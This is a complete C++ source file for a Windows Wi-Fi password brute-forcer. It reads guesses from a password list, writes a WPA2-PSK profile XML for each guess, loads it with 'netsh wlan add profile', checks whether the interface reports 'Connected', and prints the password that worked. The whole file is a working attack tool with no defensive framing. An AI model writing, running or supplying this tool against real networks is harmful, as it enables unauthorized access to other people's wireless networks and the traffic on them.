#include<iostream>
#include<stdlib.h>
#include<windows.h>
#include<fstream>
#include<string>
#include<conio.h>
using namespace std;

string fileName="myWlan.xml";
char c='"';

void writeXMLfile(string,string);
bool isConnected();
void result(bool,string,string,int);

int main()
{
	string name="",pass="";
	string ntyp="Wi-Fi",netType,fileTest=">test.txt",ntype,fil,xfileName;
	netType=c+ntyp+c+fileTest;
	xfileName=c+fileName+c;
	bool isCon=false;
	int count=0;

	HANDLE hConsole=GetStdHandle(STD_OUTPUT_HANDLE);

	do{
		SetConsoleTextAttribute(hConsole,15);
		cout<<"\nEnter Wifi Name: ";
		cin>>name;
		if(name==""){
			SetConsoleTextAttribute(hConsole,4);
			cout<<"\n\n!!Wifi Name required!!\n";
		}
	}while(name=="");

	fstream readPswLst("passwordList.txt",ios::in);

	while(getline(readPswLst,pass))
	{
		system("cls");
		SetConsoleTextAttribute(hConsole,8);
		cout<<"\n---------"<<count<<"---------";
		SetConsoleTextAttribute(hConsole,15);
		cout<<"\nTrying: ";
		SetConsoleTextAttribute(hConsole,11);
		cout<<pass;
		SetConsoleTextAttribute(hConsole,15);
		cout<<" \n\n";
		writeXMLfile(name,pass);

	  	system(("netsh wlan add profile filename="+xfileName).c_str());
	  	system("timeout 3");
	  	system(("netsh interface show interface name="+netType).c_str());

		isCon=isConnected();
		if(isCon){
			break;
		}
		count++;
	}

	result(isCon,name,pass,count);

	return 0;
}

void writeXMLfile(string name,string pass){
  	ofstream xmlFile;
	xmlFile.open(fileName.c_str());

	xmlFile<<"<?xml version="<<c<<"1.0"<<c<<"?>\n";
	xmlFile<<"<WLANProfile xmlns="<<c<<"http://www.microsoft.com/networking/WLAN/profile/v1"<<c<<">\n";
	xmlFile<<"<name>";
	xmlFile<<name;
	xmlFile<<"</name>\n<SSIDConfig>\n<SSID>\n<hex>";

	for(int i=0;i<name.length();i++){
		xmlFile<<hex<<(int)name.at(i);
	}

	xmlFile<<"</hex>\n<name>";
	xmlFile<<name;
	xmlFile<<"</name>\n</SSID>\n</SSIDConfig>\n<connectionType>ESS</connectionType>\n<connectionMode>auto</connectionMode>\n<MSM>\n<security>\n<authEncryption>";
	xmlFile<<"\n<authentication>WPA2PSK</authentication>\n<encryption>AES</encryption>\n<useOneX>false</useOneX>\n</authEncryption>\n<sharedKey>";
	xmlFile<<"\n<keyType>passPhrase</keyType>\n<protected>false</protected>\n<keyMaterial>";
	xmlFile<<pass;
	xmlFile<<"</keyMaterial>\n</sharedKey>\n</security>\n</MSM>\n";
	xmlFile<<"<MacRandomization xmlns="<<c<<"http://www.microsoft.com/networking/WLAN/profile/v3"<<c<<">\n";
	xmlFile<<"<enableRandomization>false</enableRandomization>\n</MacRandomization>\n</WLANProfile>";
	xmlFile.close();
}

bool isConnected(){
	ifstream testFile;
	testFile.open("test.txt");
	char ch;
	string check;
	int succ=0;

  	while(!testFile.eof())
  	{
	    testFile>>ch;
	    if(ch==':')
	    {
	      for(int i=0;i<9;i++)
	    	{
	        	testFile>>ch;
	        	check=check+ch;
	    	}
	    }
	    if(check=="Connected")
	    {
	    	return true;
	    }
	    
	    if(check!="Connected"){
	    	check="";
	    }
	}
	testFile.close();
	return false;
}

void result(bool isCon,string name,string pass,int count){
	system("cls");
	HANDLE hConsole=GetStdHandle(STD_OUTPUT_HANDLE);
	cout<<"Result:\n";
	if(isCon){
		SetConsoleTextAttribute(hConsole,10);
		cout<<"\n\n..............!!CONNECTED!!..............";
		SetConsoleTextAttribute(hConsole,15);
		cout<<"\n\nWifi Name:";
		SetConsoleTextAttribute(hConsole,10);
		cout<<name;
		SetConsoleTextAttribute(hConsole,15);
		cout<<"\nPassword:";
		SetConsoleTextAttribute(hConsole,10);
		cout<<pass;
	} else {
		SetConsoleTextAttribute(hConsole,4);
		cout<<"\n\n\n..............Couldn't connect!!..............";
		SetConsoleTextAttribute(hConsole,15);
		cout<<"\n\nTrials:";
		SetConsoleTextAttribute(hConsole,4);
		cout<<count;
	}

	SetConsoleTextAttribute(hConsole,15);
	cout<<"\n\n";
	system("pause");
}